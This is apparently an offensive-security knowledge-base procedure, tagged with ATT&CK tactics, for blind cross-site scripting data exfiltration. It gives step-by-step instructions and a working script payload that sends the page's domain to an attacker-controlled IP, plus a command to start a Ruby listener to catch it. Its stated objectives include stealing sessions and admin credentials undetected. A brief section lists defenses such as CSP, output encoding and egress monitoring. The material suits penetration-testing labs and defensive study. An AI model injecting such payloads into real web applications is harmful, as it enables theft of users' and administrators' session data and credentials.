---
id: 3b27c092-6ec2-45f7-aafc-2487760a77ca
name: Blind-XSS-Data-Exfiltration
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.233629+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/Blind XSS]]'
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/Tips]]'
commands:
  - '[[commands/ruby-start-simple-http-server]]'
platforms:
  - Web
  - Browser
tools: []
validated: true
---

# Blind-XSS-Data-Exfiltration

## Summary

This procedure demonstrates how to exfiltrate data from a vulnerable web application using a blind XSS payload. The payload encodes and sends stolen data, such as the document domain or other sensitive information, to an attacker-controlled server without visible output on the target page. It relies on injecting JavaScript that triggers on user interaction or page load, making it suitable for scenarios where direct observation of the exploit is not possible.

## Description

Blind XSS vulnerabilities occur when user input is reflected or stored in a way that executes JavaScript in a different context, such as admin panels or logs, without the attacker seeing the results immediately. This procedure uses a simple JavaScript payload to redirect or send data via HTTP to a listener server, confirming the vulnerability and potentially stealing session data, cookies, or page content. The target environment is typically a web application with insufficient input sanitization, such as contact forms, search fields, or error logs. Success depends on the payload reaching an execution context and the network allowing outbound connections to the attacker's server. This technique is effective for persistent data theft in multi-user environments.

## Requirements

1. Access to a web application vulnerable to blind XSS, such as through reflected input in hidden fields or stored in backend systems.
2. Ability to inject and persist the payload in user-controllable inputs.
3. An attacker-controlled server to receive exfiltrated data, set up via a simple HTTP listener.
4. Network connectivity allowing the target to reach the attacker's IP and port (e.g., no strict outbound filtering).

## Defense

Defensive measures and detection strategies:

- Implement strict input validation, output encoding (e.g., HTML entity encoding), and Content Security Policy (CSP) to prevent JavaScript execution from user inputs.
- Monitor outbound network traffic for unexpected HTTP requests to unknown domains or IPs, using tools like SIEM or web proxies.
- Deploy a Web Application Firewall (WAF) configured to detect and block common XSS payloads, including encoded redirects or data exfiltration attempts.
- Regularly audit application logs and admin interfaces for anomalous script injections.

## Objectives

1. Confirm the presence of a blind XSS vulnerability by receiving data on the controlled server.
2. Exfiltrate sensitive data such as domain information, user sessions, or page content without detection.
3. Establish a foundation for further attacks, like stealing admin credentials from log views.

## Instructions

### Step 1: Prepare the Exfiltration Payload

**Context**: Create and customize the blind XSS payload to send target data to your controlled server. This script uses document.location to redirect with encoded data, but can be modified to fetch additional elements like cookies or localStorage.

**Code** ([[codes/Blind-XSS-Data-Grabber-Payload]]):

```html
<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
```

> This payload injects a script tag that, when executed, appends the document domain to a URL and redirects to your server. Replace the IP and path with your listener details. Expected output is an HTTP GET request logged on your server containing the exfiltrated data, confirming execution.

### Step 2: Set Up the Listener Server

**Context**: Start a simple HTTP server to capture the incoming requests from the payload. This verifies the blind XSS trigger and collects the stolen data.

**Command** ([[commands/ruby-start-simple-http-server]]):

```bash
ruby -run -ehttpd . -p8080
```

> Run this in a directory where you have a grabber.php or logging script to handle requests. The server listens on port 8080 and serves files from the current directory. Expected output includes access logs showing the incoming request with query parameters, such as the domain value.
